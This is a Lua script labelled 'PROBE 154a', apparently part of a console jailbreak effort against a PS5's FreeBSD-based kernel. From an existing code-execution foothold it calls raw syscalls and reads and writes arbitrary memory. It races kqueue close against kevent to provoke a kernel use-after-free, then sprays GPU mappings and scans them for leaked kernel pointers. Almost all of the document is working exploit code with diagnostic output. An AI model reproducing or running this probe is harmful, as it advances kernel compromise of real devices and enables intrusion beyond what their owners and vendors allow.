-- CRASH_CLASS: HIGH
-- PROBE 154a: Kqueue close race via Thrd_create
--
-- Context: kqueue close races have historically produced UAFs in FreeBSD.
-- Pattern: one thread closes a kqueue fd while another thread is blocked
-- in kevent() on that fd. The close path frees the kqueue struct while
-- kevent still holds a reference. On FreeBSD 11 (PS5 kernel base),
-- kqueue_close() may race with kqueue_scan().
--
-- We have Thrd_create (C11 threading, confirmed working). Strategy:
--   1. Create kqueue via native.fcall(sys 362 = kqueue)
--   2. Register a timer event on the kqueue
--   3. Spawn threads that call kevent() in a loop on the kqueue fd
--   4. Main thread closes the kqueue fd
--   5. If we hit the race: freed kqueue struct, potential UAF
--   6. GPU mmap spray to reclaim the freed object
--   7. Scan for kernel pointers

print("=== PROBE 154a: KQUEUE CLOSE RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

if not (native and native.fcall_with_rax) then
    print("NEED native.fcall_with_rax — aborting")
    print("=== PROBE 154a COMPLETE ===")
    return
end

local la = native.addrofs and native.addrofs.libc_addrofs
if not la then
    print("NEED libc_addrofs — aborting")
    print("=== PROBE 154a COMPLETE ===")
    return
end

local stub = syscall.pipe.fn_addr
local Thrd_create = la.Thrd_create
local Thrd_join = la.Thrd_join
local Atomic_fetch_add_8 = la.Atomic_fetch_add_8
local sc_mmap = make_syscall(477)

print("Thrd_create=" .. tostring(Thrd_create))

-- ============================================================
-- SECTION A: KQUEUE CREATION + KEVENT BASELINE
-- ============================================================
print("")
print("--- SECTION A: KQUEUE BASELINE ---")

-- sys 362 = kqueue()
local kq = to_num(native.fcall_with_rax(stub, 362))
print("kqueue() fd=" .. kq)

if kq < 0 then
    print("kqueue failed — aborting")
    print("=== PROBE 154a COMPLETE ===")
    return
end

-- struct kevent (FreeBSD):
--   uintptr_t ident     +0x00 (8)
--   short     filter    +0x08 (2)
--   u_short   flags     +0x0A (2)
--   u_int     fflags    +0x0C (4)
--   intptr_t  data      +0x10 (8)
--   void*     udata     +0x18 (8)
-- Total: 0x20 (32 bytes)

-- EVFILT_TIMER = -7, EV_ADD = 0x0001, EV_ENABLE = 0x0004
-- Register a timer event that fires every 1ms
local changelist = memory.alloc(0x40)
safe_wq(changelist + 0x00, uint64(1))        -- ident = 1
safe_wd(changelist + 0x08, 0x0005)           -- filter=-7(EVFILT_TIMER) | flags=EV_ADD|EV_ENABLE
-- Actually filter is a short at +0x08, flags is u_short at +0x0A
-- EVFILT_TIMER = -7 = 0xFFF9 as unsigned short
safe_wd(changelist + 0x08, 0x0001FFF9)       -- flags=EV_ADD(0x0001) << 16 | filter=EVFILT_TIMER(0xFFF9)
-- Wait, endianness: on little-endian, +0x08 = filter (2 bytes), +0x0A = flags (2 bytes)
-- So write filter at +0x08 as short, flags at +0x0A as short
-- Use dword write: low 16 = filter, high 16 = flags
-- filter = 0xFFF9 (-7), flags = 0x0001 (EV_ADD)
safe_wd(changelist + 0x08, 0x0001FFF9)       -- {filter=EVFILT_TIMER, flags=EV_ADD}
safe_wd(changelist + 0x0C, 0)                -- fflags
safe_wq(changelist + 0x10, uint64(10))       -- data = 10ms timer interval
safe_wq(changelist + 0x18, uint64(0))        -- udata

-- sys 363 = kevent(kq, changelist, nchanges, eventlist, nevents, timeout)
local eventlist = memory.alloc(0x40)
local timeout = memory.alloc(0x10)
safe_wq(timeout, uint64(0))      -- tv_sec = 0
safe_wq(timeout + 8, uint64(0))  -- tv_nsec = 0

-- Register the timer
local kr = to_num(native.fcall_with_rax(stub, 363,
    kq, to_num(changelist), 1, to_num(eventlist), 1, to_num(timeout)))
print("kevent(register timer) ret=" .. kr)

-- Read back event
if kr > 0 then
    local ev_ident = safe_rq(eventlist)
    local ev_filter_flags = safe_rd(eventlist + 0x08)
    local ev_data = safe_rq(eventlist + 0x10)
    print("  event: ident=" .. fmt_addr(ev_ident) ..
          " filter_flags=0x" .. string.format("%X", ev_filter_flags or 0) ..
          " data=" .. fmt_addr(ev_data))
end

-- Close this test kqueue
native.fcall_with_rax(stub, 6, kq)
print("closed test kq")

-- ============================================================
-- SECTION B: RACE — CLOSE KQUEUE WHILE THREADS KEVENT
-- ============================================================
print("")
print("--- SECTION B: KQUEUE CLOSE RACE ---")

-- We'll do multiple iterations of:
-- 1. Create kqueue
-- 2. Register timer
-- 3. Spawn threads that do atomic_fetch_add (CPU pressure)
-- 4. Main thread calls kevent() then immediately close()
-- 5. Check for kernel pointer leaks in GPU mmap

local shared = memory.alloc(0x20)
local race_survived = 0
local race_crashed = 0

for round = 1, 20 do
    safe_wq(shared, uint64(0))

    -- Create kqueue
    local rkq = to_num(native.fcall_with_rax(stub, 362))
    if rkq < 0 then
        print("round " .. round .. ": kqueue failed")
    else
        -- Register timer
        safe_wq(changelist + 0x00, uint64(1))
        safe_wd(changelist + 0x08, 0x0001FFF9)
        safe_wq(changelist + 0x10, uint64(1))  -- 1ms
        safe_wq(timeout, uint64(0))
        safe_wq(timeout + 8, uint64(0))

        native.fcall_with_rax(stub, 363,
            rkq, to_num(changelist), 1, 0, 0, 0)

        -- Spawn 2 pressure threads
        local tids = {}
        for i = 1, 2 do
            local ok, t = pcall(function()
                return native.fcall_with_rax(Thrd_create, shared, Atomic_fetch_add_8, shared)
            end)
            if ok then tids[#tids + 1] = t end
        end

        -- Main thread: kevent with zero timeout then close
        -- The kevent touches the kqueue's internal structures
        native.fcall_with_rax(stub, 363,
            rkq, 0, 0, to_num(eventlist), 1, to_num(timeout))

        -- Close immediately after kevent returns
        native.fcall_with_rax(stub, 6, rkq)

        -- Try to use the closed fd (may hit freed kqueue if race won)
        local ok3, r3 = pcall(function()
            return to_num(native.fcall_with_rax(stub, 363,
                rkq, 0, 0, to_num(eventlist), 1, to_num(timeout)))
        end)

        -- Join threads
        for _, t in ipairs(tids) do
            pcall(function() native.fcall_with_rax(Thrd_join, t, uint64(0)) end)
        end

        -- Still alive?
        local alive = pcall(function() return to_num(syscall.getpid()) end)
        if alive then
            race_survived = race_survived + 1
        else
            race_crashed = race_crashed + 1
            print("*** CRASH at round " .. round .. " ***")
            return
        end
    end
end
print(string.format("race rounds: survived=%d crashed=%d", race_survived, race_crashed))

local counter = safe_rq(shared)
print("thread_counter=" .. fmt_addr(counter))

-- ============================================================
-- SECTION C: GPU RECLAIM SCAN
-- ============================================================
print("")
print("--- SECTION C: GPU RECLAIM SCAN ---")

local gpu = sc_mmap(uint64(0), uint64(16 * 0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local gh, gl = get_hi_lo(gpu)
print(string.format("gpu=0x%X%08X (16 pages)", gh, gl))

local kptr_count = 0
local ksamples = {}
for off = 0, 16 * 0x4000 - 8, 8 do
    local ok, val = pcall(function() return memory.read_qword(gpu + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_count = kptr_count + 1
            if #ksamples < 20 then
                ksamples[#ksamples + 1] = string.format("+0x%X: 0x%08X%08X", off, vh, vl)
            end
        end
    end
end
print("kptr_count=" .. kptr_count)
for _, s in ipairs(ksamples) do print(s) end

-- VM counter
local vm = to_num(native.fcall_with_rax(stub, 624))
print("sys624_vm=" .. vm)

local cpid = to_num(syscall.getpid())
print("")
print("canary=" .. cpid)
print("=== PROBE 154a COMPLETE ===")
